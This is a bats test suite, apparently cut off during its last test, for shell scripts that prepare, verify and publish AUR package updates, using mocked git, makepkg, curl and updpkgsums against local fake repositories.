#!/usr/bin/env bats

load helpers/setup.sh
bats_require_minimum_version 1.5.0

setup() {
  setup_test_env
  source "$TEST_TMPDIR/scripts/lib.sh"
  H1=$(printf '1%.0s' {1..64})
  H2=$(printf '2%.0s' {1..64})
  H3=$(printf 'a%.0s' {1..64})
  H4=$(printf 'b%.0s' {1..64})
  OLD="$TEST_TMPDIR/old.PKGBUILD"
  NEW="$TEST_TMPDIR/new.PKGBUILD"
}

teardown() {
  teardown_test_env
}

# Helper: PKGBUILD with the given pkgver, pkgrel and checksum block
# Usage: write_pkgbuild <path> <pkgver> <pkgrel> <sums block>
write_pkgbuild() {
  cat >"$1" <<EOF
pkgname=demo
pkgver=$2
pkgrel=$3
pkgdesc="demo"
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("https://example.com/demo-\${pkgver}.tar.gz"
        "local.patch")
$4

package() {
  install -Dm755 demo "\$pkgdir/usr/bin/demo"
}
EOF
}

# Helper: .SRCINFO with the given pkgver, pkgrel and two sha256sums
# Usage: write_srcinfo <path> <pkgver> <pkgrel> <sum1> <sum2>
write_srcinfo() {
  printf '%s\n' \
    "pkgbase = demo" \
    $'\tpkgdesc = demo' \
    $'\tpkgver = '"$2" \
    $'\tpkgrel = '"$3" \
    $'\turl = https://example.com' \
    $'\tarch = x86_64' \
    $'\tlicense = MIT' \
    $'\tsource = https://example.com/demo-'"$2"'.tar.gz' \
    $'\tsource = local.patch' \
    $'\tsha256sums = '"$4" \
    $'\tsha256sums = '"$5" \
    "" \
    "pkgname = demo" >"$1"
}

# Helper: bare repo standing in for the AUR repo of <pkg>, holding the given
# PKGBUILD, .SRCINFO and other files. A git on PATH clones it for any AUR
# URL and logs that URL to $TEST_TMPDIR/clone-urls. A mirror clone gets
# $TEST_TMPDIR/upstream.git instead, logged to git-clone-urls. Sets
# AUR_REMOTE and AUR_BASE.
# Usage: make_aur_remote <pkg> <PKGBUILD path> <.SRCINFO path> [file]...
make_aur_remote() {
  local work="$TEST_TMPDIR/aur-work-$1"
  AUR_REMOTE="$TEST_TMPDIR/aur-remote/$1.git"
  git init -q --bare -b master "$AUR_REMOTE"
  git init -q -b master "$work"
  cp "$2" "$work/PKGBUILD"
  cp "$3" "$work/.SRCINFO"
  if [[ $# -gt 3 ]]; then
    cp "${@:4}" "$work/"
  fi
  git -C "$work" add .
  git -C "$work" -c user.name=aur -c user.email=aur@example.invalid \
    -c commit.gpgsign=false commit -qm "aur state"
  git -C "$work" push -q "$AUR_REMOTE" master
  AUR_BASE=$(git -C "$AUR_REMOTE" rev-parse HEAD)
  cat >"$MOCK_DIR/git" <<EOF
#!/usr/bin/env bash
if [[ "\$1" == "clone" && " \$* " == *" --mirror "* ]]; then
  echo "\${@: -2:1}" >>"$TEST_TMPDIR/git-clone-urls"
  exec env -u GIT_ALLOW_PROTOCOL /usr/bin/git clone -q --mirror "$TEST_TMPDIR/upstream.git" "\${@: -1}"
fi
if [[ "\$1" == "clone" ]]; then
  echo "\${@: -2:1}" >>"$TEST_TMPDIR/clone-urls"
  echo "\${*:2:\$#-3}" >>"$TEST_TMPDIR/clone-opts"
  exec /usr/bin/git clone -q "\${@:2:\$#-3}" "$AUR_REMOTE" "\${@: -1}"
fi
exec /usr/bin/git "\$@"
EOF
  chmod +x "$MOCK_DIR/git"
}

# Helper: add a file to the AUR repo of demo and hand the new commit to the
# prepared update as its base
# Usage: aur_add_file <name> <content>
aur_add_file() {
  local work="$TEST_TMPDIR/aur-work-demo"
  printf '%s\n' "$2" >"$work/$1"
  git -C "$work" add "$1"
  git -C "$work" -c user.name=aur -c user.email=aur@example.invalid \
    -c commit.gpgsign=false commit -qm "add $1"
  git -C "$work" push -q "$AUR_REMOTE" master
  git -C "$AUR_REMOTE" rev-parse HEAD >"$PREPARED/base"
}

# Helper: makepkg that prints a fixed .SRCINFO, the given file or a single
# pkgbase line, and namcap that finds nothing
# Usage: mock_pkg_tools [.SRCINFO]
mock_pkg_tools() {
  if [[ -n "${1:-}" ]]; then
    printf '#!/usr/bin/env bash\ncat %q\n' "$1" >"$MOCK_DIR/makepkg"
  else
    printf '#!/usr/bin/env bash\necho "pkgbase = demo"\n' >"$MOCK_DIR/makepkg"
  fi
  printf '#!/usr/bin/env bash\nexit 0\n' >"$MOCK_DIR/namcap"
  chmod +x "$MOCK_DIR/makepkg" "$MOCK_DIR/namcap"
}

# Helper: a curl that answers the source check with a file, and an
# updpkgsums that keeps the checksums
mock_source_tools() {
  printf '#!/usr/bin/env bash\nprintf "200 application/octet-stream"\n' >"$MOCK_DIR/curl"
  printf '#!/usr/bin/env bash\nexit 0\n' >"$MOCK_DIR/updpkgsums"
  chmod +x "$MOCK_DIR/curl" "$MOCK_DIR/updpkgsums"
}

# === update-pkg.sh --prepare ===

@test "update-pkg --prepare: hands over the files and the AUR HEAD, pushes nothing" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo
current: '1.0.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('SKIP' 'SKIP')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 SKIP SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools
  mock_source_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  grep -qx 'pkgver=1.1.0' "$TEST_TMPDIR/out/demo/PKGBUILD"
  grep -qx 'pkgbase = demo' "$TEST_TMPDIR/out/demo/.SRCINFO"
  [ "$(cat "$TEST_TMPDIR/out/demo/base")" = "$AUR_BASE" ]
  grep -qx 'https://aur.archlinux.org/demo.git' "$TEST_TMPDIR/clone-urls"
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.0.0" ]
}

@test "update-pkg --prepare: hands over the AUR files when the AUR has the version" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo
current: '0.9.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('SKIP' 'SKIP')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 SKIP SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.0.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 2 ]
  cmp "$OLD" "$TEST_TMPDIR/out/demo/PKGBUILD"
  cmp "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/out/demo/.SRCINFO"
  [ "$(cat "$TEST_TMPDIR/out/demo/base")" = "$AUR_BASE" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "0.9.0" ]
}

@test "update-pkg: commits the updated PKGBUILD and .SRCINFO" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo
current: '1.0.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('SKIP' 'SKIP')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 SKIP SKIP
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 SKIP SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0
  [ "$status" -eq 0 ]
  git -C "$AUR_REMOTE" show HEAD:PKGBUILD | grep -qx 'pkgver=1.1.0'
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.1.0" ]
}

@test "update-pkg --dry-run: shows the PKGBUILD diff and pushes nothing" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo
current: '1.0.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('SKIP' 'SKIP')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 SKIP SKIP
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 SKIP SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"[DRY RUN] Would push demo 1.1.0 to AUR"* ]]
  [[ "$output" == *"-pkgver=1.0.0"*"+pkgver=1.1.0"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.0.0" ]
}

@test "update-pkg: writes current when the AUR already has the version" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo
current: '0.9.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('SKIP' 'SKIP')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 SKIP SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.0.0
  [ "$status" -eq 2 ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.0.0" ]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

@test "update-pkg: refuses an unknown option" {
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --bogus
  [ "$status" -eq 1 ]
  [[ "$output" == *"Unknown option: --bogus"* ]]
}

@test "update-pkg: fails when the AUR repo holds no PKGBUILD" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo
current: '1.0.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('SKIP' 'SKIP')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 SKIP SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  local work="$TEST_TMPDIR/aur-work-demo"
  git -C "$work" rm -q PKGBUILD
  git -C "$work" -c user.name=aur -c user.email=aur@example.invalid \
    -c commit.gpgsign=false commit -qm "drop PKGBUILD"
  git -C "$work" push -q "$AUR_REMOTE" master

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 1 ]
  [[ "$output" == *"No PKGBUILD found in AUR repo"* ]]
}

# Helper: demo 1.0.0 on the AUR with real checksums, a source check that
# passes and an updpkgsums that keeps the checksums
setup_hashed_demo() {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  write_pkgbuild "$OLD" 1.0.0 1 "sha256sums=('$H1' '$H2')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 1 "$H1" "$H2"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools
  mock_source_tools
}

@test "update-pkg: stops when updpkgsums fails" {
  setup_hashed_demo
  printf '#!/usr/bin/env bash\nexit 1\n' >"$MOCK_DIR/updpkgsums"

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 1 ]
  [[ "$output" == *"updpkgsums failed, refusing to push stale checksums"* ]]
  [ ! -e "$TEST_TMPDIR/out/demo" ]
}

@test "update-pkg: stops when makepkg --verifysource fails" {
  setup_hashed_demo
  cat >"$MOCK_DIR/makepkg" <<'EOF'
#!/usr/bin/env bash
[[ " $* " == *" --verifysource "* ]] && exit 1
echo "pkgbase = demo"
EOF

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 1 ]
  [[ "$output" == *"Checksum verification failed, aborting"* ]]
  [ ! -e "$TEST_TMPDIR/out/demo" ]
}

@test "update-pkg: stops when makepkg --printsrcinfo fails" {
  setup_hashed_demo
  cat >"$MOCK_DIR/makepkg" <<'EOF'
#!/usr/bin/env bash
[[ " $* " == *" --printsrcinfo "* ]] && exit 1
exit 0
EOF

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 1 ]
  [[ "$output" == *"makepkg --printsrcinfo failed"* ]]
  [ ! -e "$TEST_TMPDIR/out/demo" ]
}

# Helper: PKGBUILD whose pkgver= line is <pkgver line> and whose one source
# is <source>, built from the variables of <head>, with the checksum $H1
# Usage: write_pkgbuild_from <path> <head> <pkgver line> <source>
write_pkgbuild_from() {
  cat >"$1" <<EOF
$2
pkgname=demo
$3
pkgrel=1
pkgdesc="demo"
arch=('any')
url="https://example.com"
license=('MIT')
source=("$4")
sha256sums=('$H1')

package() {
  :
}
EOF
}

# pkgver="${_pkgver//-/.}" with the source built from _pkgver
@test "update-pkg: refuses a bump that changes no source URL and no checksum" {
  create_test_package "demo" "github-tag" "upstream:
  project: owner/repo
current: '2025.04.03'"
  # shellcheck disable=SC2016
  write_pkgbuild_from "$OLD" '_pkgver=2025-04-03' 'pkgver="${_pkgver//-/.}"' \
    'demo-$_pkgver.tar.gz::https://example.com/archive/$_pkgver.tar.gz'
  local src="demo-2025-04-03.tar.gz::https://example.com/archive/2025-04-03.tar.gz"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2025.04.03 "$src" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2026.09.10 "$src" "$H1"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2026.09.10
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

# pkgver built from an array that the source uses too
@test "update-pkg: refuses a source that keeps the old version" {
  create_test_package "demo" "github-tag" "upstream:
  project: owner/repo
current: '6.00.3091'"
  # shellcheck disable=SC2016
  write_pkgbuild_from "$OLD" '_pkver=(6.00 3091)' 'pkgver=${_pkver[0]}.${_pkver[1]}' \
    'https://example.com/player-${_pkver[0]}.${_pkver[1]}beta7-x86_64.tar.zst'
  local src="https://example.com/player-6.00.3091beta7-x86_64.tar.zst"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 6.00.3091 "$src" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 6.00.3092 "$src" "$H1"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 6.00.3092
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
  [ "$(git -C "$AUR_REMOTE" rev-parse HEAD)" = "$AUR_BASE" ]
}

# Helper: split PKGBUILD in the shape of liblinear, with the checksum <sum>
# Usage: write_split_pkgbuild <path> <pkgver> <pkgrel> <sum>
write_split_pkgbuild() {
  cat >"$1" <<EOF
pkgbase=demo
pkgname=(demo python-demo)
pkgver=$2
pkgrel=$3
pkgdesc="demo"
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("https://example.com/\$pkgbase-\$pkgver.tar.gz")
sha256sums=('$4')

package_demo() {
  install -Dm755 demo "\$pkgdir/usr/bin/demo"
}

package_python-demo() {
  pkgdesc="Python bindings for demo"
  depends=("demo=\$pkgver")
  install -Dm644 demo.py "\$pkgdir/usr/lib/demo.py"
}
EOF
}

# Helper: the .SRCINFO makepkg --printsrcinfo prints for write_split_pkgbuild
# Usage: write_split_srcinfo <path> <pkgver> <pkgrel> <sum>
write_split_srcinfo() {
  printf '%s\n' \
    "pkgbase = demo" \
    $'\tpkgdesc = demo' \
    $'\tpkgver = '"$2" \
    $'\tpkgrel = '"$3" \
    $'\turl = https://example.com' \
    $'\tarch = x86_64' \
    $'\tlicense = MIT' \
    $'\tsource = https://example.com/demo-'"$2"'.tar.gz' \
    $'\tsha256sums = '"$4" \
    "" \
    "pkgname = demo" \
    "" \
    "pkgname = python-demo" \
    $'\tpkgdesc = Python bindings for demo' \
    $'\tdepends = demo='"$2" >"$1"
}

@test "a split package goes through prepare, verify and publish" {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  local old_sum new_sum
  old_sum=$(printf 'source of %s\n' https://example.com/demo-1.0.0.tar.gz | sha256sum | cut -d' ' -f1)
  new_sum=$(printf 'source of %s\n' https://example.com/demo-1.1.0.tar.gz | sha256sum | cut -d' ' -f1)
  write_split_pkgbuild "$OLD" 1.0.0 2 "$old_sum"
  write_split_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$old_sum"
  write_split_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$new_sum"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools
  printf '#!/usr/bin/env bash\nsed -i s/%s/%s/ PKGBUILD\n' "$old_sum" "$new_sum" >"$MOCK_DIR/updpkgsums"

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  write_split_pkgbuild "$NEW" 1.1.0 1 "$new_sum"
  [ "$(git -C "$AUR_REMOTE" show HEAD:PKGBUILD)" = "$(cat "$NEW")" ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

# Helper: the AUR at an old pkgver of a package with the given pkgver_dash,
# whose source restores the dash, and the .SRCINFO makepkg prints for the
# new pkgver in new.SRCINFO. Sets OLD_SUM and NEW_SUM, the checksums of the
# two downloads.
# Usage: setup_dash_package <pkgver_dash> <source> <old pkgver> <old upstream version> <new pkgver> <new upstream version>
setup_dash_package() {
  local dash="$1" source="$2" old="$3" old_up="$4" new="$5" new_up="$6"
  create_test_package "demo" "npm" "upstream:
  registry: demo
current: '$old'
pkgver_dash: '$dash'"
  OLD_SUM=$(printf 'source of %s\n' "https://example.com/demo-$old_up.tgz" | sha256sum | cut -d' ' -f1)
  NEW_SUM=$(printf 'source of %s\n' "https://example.com/demo-$new_up.tgz" | sha256sum | cut -d' ' -f1)
  cat >"$OLD" <<EOF
pkgname=demo
pkgver=$old
pkgrel=1
pkgdesc="demo"
arch=('any')
url="https://example.com"
license=('MIT')
source=("$source")
sha256sums=('$OLD_SUM')

package() {
  :
}
EOF
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" "$old" "https://example.com/demo-$old_up.tgz" "$OLD_SUM"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" "$new" "https://example.com/demo-$new_up.tgz" "$NEW_SUM"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools
  printf '#!/usr/bin/env bash\nsed -i s/%s/%s/ PKGBUILD\n' "$OLD_SUM" "$NEW_SUM" >"$MOCK_DIR/updpkgsums"
}

@test "a package with pkgver_dash goes through prepare, verify and publish" {
  # shellcheck disable=SC2016
  setup_dash_package _ 'https://example.com/demo-${pkgver//_/-}.tgz' 0.0.1_rc.20 0.0.1-rc.20 0.0.4 0.0.4
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 0.0.4 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 0.0.4 "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

# pkgver 2.5.0rc1 for 2.5.0-rc1, which vercmp puts below 2.5.0
@test "a package with pkgver_dash '' goes through prepare, verify and publish" {
  # shellcheck disable=SC2016
  setup_dash_package '' 'https://example.com/demo-${pkgver/rc/-rc}.tgz' 2.5.0rc1 2.5.0-rc1 2.5.0rc2 2.5.0-rc2
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc2 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 2.5.0rc2 "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

@test "update-pkg: pushes a package with pkgver_dash" {
  # shellcheck disable=SC2016
  setup_dash_package _ 'https://example.com/demo-${pkgver//_/-}.tgz' 0.0.1_rc.20 0.0.1-rc.20 0.0.4 0.0.4
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 0.0.4
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

@test "update-pkg: pushes a package with pkgver_dash ''" {
  # shellcheck disable=SC2016
  setup_dash_package '' 'https://example.com/demo-${pkgver/rc/-rc}.tgz' 2.5.0rc1 2.5.0-rc1 2.5.0rc2 2.5.0-rc2
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 2.5.0rc2
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

# Helper: the AUR at 4.4215 of a package with pkgver_format: '4.%s', whose
# source takes the build from ${pkgver#4.}, and the .SRCINFO makepkg prints
# for 4.4216 in new.SRCINFO. Sets OLD_SUM and NEW_SUM, the checksums of the
# two downloads.
setup_format_package() {
  create_test_package "demo" "webpage-scrape" "upstream:
  url: https://example.com/updates.json
  pattern: 'latest_version: ([0-9]+)'
current: '4.4215'
pkgver_format: '4.%s'"
  OLD_SUM=$(printf 'source of %s\n' https://example.com/demo_build_4215.tar.xz | sha256sum | cut -d' ' -f1)
  NEW_SUM=$(printf 'source of %s\n' https://example.com/demo_build_4216.tar.xz | sha256sum | cut -d' ' -f1)
  cat >"$OLD" <<EOF
pkgname=demo
pkgver=4.4215
pkgrel=1
pkgdesc="demo"
arch=('any')
url="https://example.com"
license=('MIT')
source=("https://example.com/demo_build_\${pkgver#4.}.tar.xz")
sha256sums=('$OLD_SUM')

package() {
  :
}
EOF
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 4.4215 https://example.com/demo_build_4215.tar.xz "$OLD_SUM"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 4.4216 https://example.com/demo_build_4216.tar.xz "$NEW_SUM"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools
  printf '#!/usr/bin/env bash\nsed -i s/%s/%s/ PKGBUILD\n' "$OLD_SUM" "$NEW_SUM" >"$MOCK_DIR/updpkgsums"
}

@test "a package with pkgver_format goes through prepare, verify and publish" {
  setup_format_package
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 4.4216 --prepare "$TEST_TMPDIR/out"
  [ "$status" -eq 0 ]
  mock_downloads
  run "$TEST_TMPDIR/scripts/verify-pkg.sh" demo "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 4.4216 "$TEST_TMPDIR/out/demo"
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

@test "update-pkg: pushes a package with pkgver_format" {
  setup_format_package
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 4.4216
  [ "$status" -eq 0 ]
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

@test "update-pkg: updates the checksums next to the SKIP of a VCS source" {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  cat >"$OLD" <<EOF
pkgname=demo
pkgver=1.0.0
pkgrel=1
pkgdesc="demo"
arch=('any')
url="https://example.com"
license=('MIT')
source=("demo::git+https://example.com/demo.git"
        "https://example.com/data-\${pkgver}.tar.gz")
sha256sums=('SKIP'
            '$H1')

package() {
  :
}
EOF
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0 \
    demo::git+https://example.com/demo.git SKIP https://example.com/data-1.0.0.tar.gz "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.1.0 \
    demo::git+https://example.com/demo.git SKIP https://example.com/data-1.1.0.tar.gz "$H2"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools
  printf '#!/usr/bin/env bash\nsed -i s/%s/%s/ PKGBUILD\n' "$H1" "$H2" >"$MOCK_DIR/updpkgsums"

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0
  [ "$status" -eq 0 ]
  [[ "$output" == *"Updating checksums"* ]]
  git -C "$AUR_REMOTE" show HEAD:PKGBUILD | grep -qx "            '$H2')"
}

# The tarball and signature pair of lib32-gettext
@test "update-pkg: updates the checksums next to the SKIP of a signature" {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  cat >"$OLD" <<EOF
pkgname=demo
pkgver=1.0.0
pkgrel=1
pkgdesc="demo"
arch=('any')
url="https://example.com"
license=('MIT')
source=("https://example.com/demo-\${pkgver}.tar.gz"{,.sig})
sha256sums=('$H1'
            'SKIP')

package() {
  :
}
EOF
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0 \
    https://example.com/demo-1.0.0.tar.gz "$H1" https://example.com/demo-1.0.0.tar.gz.sig SKIP
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.1.0 \
    https://example.com/demo-1.1.0.tar.gz "$H2" https://example.com/demo-1.1.0.tar.gz.sig SKIP
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  mock_pkg_tools "$TEST_TMPDIR/new.SRCINFO"
  mock_source_tools
  # updpkgsums hashes the new tarball and keeps the SKIP of the signature
  printf '#!/usr/bin/env bash\nsed -i s/%s/%s/ PKGBUILD\n' "$H1" "$H2" >"$MOCK_DIR/updpkgsums"

  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0
  [ "$status" -eq 0 ]
  [[ "$output" == *"Updating checksums"* ]]
  git -C "$AUR_REMOTE" show HEAD:PKGBUILD | grep -qx "sha256sums=('$H2'"
  [ "$(git -C "$AUR_REMOTE" show HEAD:.SRCINFO)" = "$(cat "$TEST_TMPDIR/new.SRCINFO")" ]
}

@test "update-pkg: --prepare needs a directory" {
  create_test_package "demo" "github-nightly" "upstream:
  project: owner/repo"
  run "$TEST_TMPDIR/scripts/update-pkg.sh" demo 1.1.0 --prepare
  [ "$status" -eq 1 ]
  [[ "$output" == *"--prepare"* ]]
}

# === publish-pkg.sh ===

# Helper: the AUR at 1.0.0 with real checksums, and a prepared 1.1.0 in
# $TEST_TMPDIR/out/demo that differs only where it may
setup_publish() {
  create_test_package "demo" "github-release" "upstream:
  project: owner/repo
current: '1.0.0'"
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  make_aur_remote demo "$OLD" "$TEST_TMPDIR/old.SRCINFO"
  PREPARED="$TEST_TMPDIR/out/demo"
  mkdir -p "$PREPARED"
  write_pkgbuild "$PREPARED/PKGBUILD" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  write_srcinfo "$PREPARED/.SRCINFO" 1.1.0 1 "$H3" "$H4"
  echo "$AUR_BASE" >"$PREPARED/base"
}

@test "publish-pkg: pushes a prepared update over SSH" {
  setup_publish
  run "$TEST_TMPDIR/scripts/publish-pkg.sh" demo 1.1.0 "$PREPARED"
  [ "$status" -eq 0 ]
  grep -qx 'ssh://aur@aur.archlinux.org/demo.git' "$TEST_TMPDIR/clone-urls"
  git -C "$AUR_REMOTE" show HEAD:PKGBUILD | grep -qx 'pkgver=1.1.0'
  [ "$(git -C "$AUR_REMOTE" log -1 --format=%s)" = "1.1.0 release from github-release" ]
  [ "$(pkg_get "$TEST_TMPDIR/packages/demo.yml" .current)" = "1.1.0" ]
